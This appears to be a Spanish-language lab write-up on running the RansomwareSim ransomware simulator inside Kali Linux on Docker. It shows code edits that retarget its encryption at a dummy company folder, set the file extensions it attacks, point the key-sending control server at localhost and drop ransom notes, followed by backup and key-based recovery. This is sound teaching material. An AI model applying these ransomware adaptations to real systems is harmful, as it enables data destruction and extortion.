# Laboratorio — Simulación de recuperación en entorno controlado (Kali Linux + Docker)

## Objetivo

Implementar un laboratorio educativo utilizando Kali Linux dentro de Docker para representar un escenario controlado de impacto y recuperación.

El laboratorio busca comprender el flujo básico de funcionamiento de un ransomware utilizando:

* Python
* Fernet
* sockets TCP
* arquitectura cliente-servidor
* automatización de archivos
* Linux + Docker

---

# Arquitectura del laboratorio

```text
EndeavourOS (Host)

└── Docker

    └── Kali Linux

        └── lab_ransom/

            ├── RansomwareSim/
            │   ├── Encoder.py
            │   ├── Decoder.py
            │   ├── ControlServer.py
            │   ├── requirements.txt
            │   └── ...
            │
            ├── empresa/
            │   ├── finanzas/
            │   ├── rrhh/
            │   └── gerencia/
            │
            └── respaldo/
```

---

# Paso 1 — Verificar contenedor Docker

Verificar contenedores:

```bash
docker ps -a
```

Iniciar Kali:

```bash
docker start -ai kali
```

---

# Paso 2 — Preparar entorno

Actualizar repositorios:

```bash
apt update
```

Instalar herramientas necesarias:

```bash
apt install -y git python3 python3-pip python3-venv tree neovim
```

---

# Paso 3 — Crear laboratorio

Crear directorio:

```bash
mkdir /lab_ransom
```

Entrar:

```bash
cd /lab_ransom
```

---

# Paso 4 — Clonar repositorio

Clonar:

```bash
git clone https://github.com/HalilDeniz/RansomwareSim.git
```

Entrar:

```bash
cd RansomwareSim
```

Verificar contenido:

```bash
tree -L 1
```

Resultado esperado:

```text
.
├── ControlServer.py
├── Decoder.py
├── Encoder.py
├── LICENSE
├── Readme.md
├── SECURITY.md
├── img
└── requirements.txt
```

---

# Paso 5 — Crear entorno virtual

Crear entorno virtual:

```bash
python3 -m venv lab_ransom
```

Activar:

```bash
source lab_ransom/bin/activate
```

Verificar:

```bash
which python
```

Instalar dependencias:

```bash
pip install -r requirements.txt
```

Instalar colorama:

```bash
pip install colorama
```

Verificar librerías:

```bash
pip list
```

---

# Paso 6 — Crear estructura de empresa

Volver al directorio principal:

```bash
cd ..
```

Crear directorios:

```bash
mkdir -p empresa/{finanzas,rrhh,gerencia}
```

Crear archivos simulados:

```bash
touch empresa/finanzas/{clientes.xlsx,pagos.pdf,facturas.docx}
```

```bash
touch empresa/rrhh/{empleados.docx,contratos.pdf,nomina.xlsx}
```

```bash
touch empresa/gerencia/{reportes.docx,estrategia.txt,proyectos.pdf}
```

---

# Paso 7 — Crear respaldo

Crear backup:

```bash
cp -r empresa respaldo
```

---

# Verificación final

```bash
tree -L 3
```

Resultado esperado:

```text
.
├── RansomwareSim
│   ├── ControlServer.py
│   ├── Decoder.py
│   ├── Encoder.py
│   ├── requirements.txt
│   └── ...
│
├── empresa
│   ├── finanzas
│   ├── gerencia
│   └── rrhh
│
└── respaldo
```

---

# Ejecución del cifrado

El proyecto original fue diseñado para Windows.

Durante el laboratorio se realizaron múltiples modificaciones para adaptarlo correctamente a Docker + Kali Linux.

---

# ControlServer.py

## Iniciar servidor

Primera terminal:

```bash
python3 ControlServer.py
```

---

# Encoder.py

## Abrir segunda terminal

Ejecutar:

```bash
docker exec -it kali bash
```

Entrar:

```bash
cd /lab_ransom/RansomwareSim
```

Activar entorno virtual:

```bash
source lab_ransom/bin/activate
```

---

## Cambio de directorio objetivo

Implementación original:

```python
directory = 'dosyalar/'
```

Nueva implementación:

```python
directory = '/lab_ransom/empresa/'
```

---

## Cambio de host TCP

Implementación original:

```python
server_host = '10.0.2.37'
```

Nueva implementación:

```python
server_host = '127.0.0.1'
```

Motivo:

```text
Todos los componentes se ejecutan dentro del mismo contenedor Kali Linux.
```

---

## Agregado de extensiones objetivo

Implementación utilizada:

```python
file_extensions = ['.txt', '.docx', '.jpg', '.xlsx', '.pdf']
```

Objetivo:

```text
Representar múltiples tipos de información corporativa dentro del laboratorio.
```

---

## Adaptación de create_readme()

La implementación original estaba diseñada para Windows Desktop.

### Implementación original

```python
def create_readme(self):

    desktop_path = os.path.join(
        os.path.join(os.environ['USERPROFILE']),
        'Desktop'
    )

    readme_path = os.path.join(desktop_path, 'Readme.txt')

    with open(readme_path, 'w') as file:

        file.write(
            "This is a simulation program, your files are encrypted."
        )
```

### Problemas detectados

```text
- USERPROFILE es exclusivo de Windows
- Docker/Kali no utiliza Desktop
- El laboratorio no posee entorno gráfico
```

### Nueva implementación

```python
def create_readme(self):

    for root, dirs, files in os.walk(self.directory):

        readme_path = os.path.join(root, "mensaje.txt")

        with open(readme_path, "w") as file:

            file.write(
                "=== SIMULACIÓN DE RANSOMWARE ===\n\n"
                "Sus archivos han sido cifrados como parte "
                "de una práctica educativa.\n"
                "No se preocupe, esto es solo una simulación.\n\n"
                f"Directorio afectado:\n{root}\n"
            )

        print(f"[+] README creado: {readme_path}")
```

Resultado:

```text
empresa/
├── mensaje.txt
├── finanzas/
│   └── mensaje.txt
├── rrhh/
│   └── mensaje.txt
└── gerencia/
    └── mensaje.txt
```

---

## Cambio de orden de ejecución

Implementación original:

```python
simulator.find_and_encrypt_files()
simulator.send_data_to_server()
simulator.create_readme()
```

Nueva implementación:

```python
simulator.find_and_encrypt_files()
simulator.create_readme()
simulator.send_data_to_server()
```

Motivo:

```text
Si la conexión TCP fallaba, el programa terminaba antes
de crear las notas mensaje.txt.
```

---

## Ejecutar cifrado

Segunda terminal:

```bash
python3 Encoder.py
```

Funcionamiento:

```text
- Genera clave Fernet
- Recorre directorios
- Cifra archivos
- Crea mensaje.txt
- Envía información al servidor
```

---

# Resultado esperado

```text
empresa/
├── finanzas/
│   ├── clientes.xlsx.denizhalil
│   ├── pagos.pdf.denizhalil
│   └── mensaje.txt
│
├── rrhh/
│   └── ...
│
└── gerencia/
    └── ...
```

Verificar archivos cifrados:

```bash
find /lab_ransom/empresa -type f
```

---

# Escenarios de recuperación

## Caso 1 — Existe respaldo

Recuperación mediante backup:

```bash
rm -rf empresa
cp -r respaldo empresa
```

Funcionamiento:

```text
- Se elimina el directorio afectado
- Se restaura la información desde respaldo
- No es necesario utilizar Decoder.py
```

---

## Caso 2 — No existe respaldo

Recuperación simulada utilizando Decoder.py y ControlServer.py.

---

# Decoder.py

## Cambio de directorio objetivo

Implementación original:

```python
directory = 'dosyalar/'
```

Nueva implementación:

```python
directory = '/lab_ransom/empresa/'
```

---

## Cambio de host TCP

Implementación original:

```python
server_host = '10.0.2.37'
```

Nueva implementación:

```python
server_host = '127.0.0.1'
```

---

## Conversión de clave Fernet

Problema detectado:

```python
fernet = Fernet(key)
```

La clave recibida desde JSON llegaba como string.

### Solución implementada

```python
fernet = Fernet(key.encode())
```

Motivo:

Fernet requiere la clave en formato bytes.

---

## Adaptación de delete_readme()

La implementación original dependía de Windows Desktop.

### Implementación original

```python
def delete_readme(self):

    desktop_path = os.path.join(
        os.path.join(os.environ['USERPROFILE']),
        'Desktop'
    )

    readme_path = os.path.join(desktop_path, 'Readme.txt')

    if os.path.exists(readme_path):

        os.remove(readme_path)
```

### Nueva implementación

```python
def delete_readme(self):

    for root, dirs, files in os.walk(self.directory):

        for file in files:

            if file == "mensaje.txt":

                readme_path = os.path.join(root, file)

                os.remove(readme_path)

                print(f"[+] Deleted: {readme_path}")
```

---

## Ejecutar descifrado

Ejecutar en la segunda terminal

```bash
python3 Decoder.py
```

Funcionamiento:

```text
- Solicita la clave al servidor
- Descifra archivos .denizhalil
- Restaura archivos originales
- Elimina mensaje.txt
```

---

# Flujo de recuperación

```text
1. Ejecutar ControlServer.py
2. Ejecutar Encoder.py
3. El servidor recibe la clave Fernet
4. Ejecutar Decoder.py
5. Decoder solicita la clave
6. ControlServer muestra la clave
7. Ingresar la clave Fernet recibida por ControlServer.py
8. Los archivos son restaurados
```

---

# Objetivo educativo

```text
Este laboratorio fue desarrollado únicamente con fines educativos
y de aprendizaje en entornos controlados.

El objetivo es comprender:

- cifrado simétrico
- flujo encrypt/decrypt
- sockets TCP
- arquitectura cliente-servidor
- automatización de archivos
- adaptación Windows → Linux
- recuperación de información
- manejo de claves Fernet
```
